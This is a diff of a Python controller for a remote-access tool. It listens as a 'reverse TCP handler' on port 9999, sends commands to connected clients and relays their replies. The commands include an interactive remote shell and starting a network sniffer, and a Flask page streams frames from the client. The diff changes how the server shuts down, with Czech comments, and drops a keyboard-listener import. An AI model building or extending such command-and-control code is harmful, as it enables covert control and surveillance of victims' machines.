@@ -1,21 +1,16 @@
 import socket
 import threading
 import time
-import signal
 from flask import Flask, Response, request
 from colorama import Fore, Style, init
 import cv2
 import numpy as np
-from pynput import keyboard
-import sys
-import os
 
 init(autoreset=True)
 
 app = Flask(__name__)
 clients = {}
 server_thread = None
-
 
 
 def start_streaming(client_socket, mode):
@@ -31,9 +26,7 @@ def start_streaming(client_socket, mode):
 
     print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
-
-    # Run the Flask app in a separate thread to handle the streaming
-    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
+    app.run(host='0.0.0.0', port=5000)
 
 def generate_frames(client_socket):
     while True:
@@ -61,7 +54,7 @@ def handle_client(client_socket, addr):
 
         if command == "sniffer_start":
             print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
-            
+
         if command == "shell":
             print(Fore.YELLOW + "[ * ] Entering interactive shell mode. Type 'exit' to leave.")
             while True:
@@ -116,24 +109,25 @@ def handle_client(client_socket, addr):
             continue
 
         client_socket.send(command.encode('utf-8'))
+        
 
 def stop_server():
     print(Fore.RED + "[ * ] Stopping Flask server...")
-    os.kill(os.getpid(), signal.SIGINT)  # Trigger a SIGINT to properly shut down the Flask app
+    # Zavolání shutdown funkce při aktivním HTTP požadavku
+    func = request.environ.get('werkzeug.server.shutdown')
+    if func:
+        func()
+    else:
+        print(Fore.RED + "[ * ] Nezdařilo se zastavit Flask server!")
 
-def signal_handler(sig, frame):
-    print(Fore.RED + "[ * ] CTRL+C detected! Stopping Flask server...")
-    stop_server()
-    sys.exit(0)
 
 def main():
-    signal.signal(signal.SIGINT, signal_handler)
-
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(('0.0.0.0', 9999))
     server_socket.listen(5)
     print(Fore.GREEN + "[ * ] Started reverse TCP handler on 0.0.0.0:9999")
     print(Fore.GREEN + "[ * ] Listening for incoming connections...")
+
 
     while True:
         client_socket, addr = server_socket.accept()
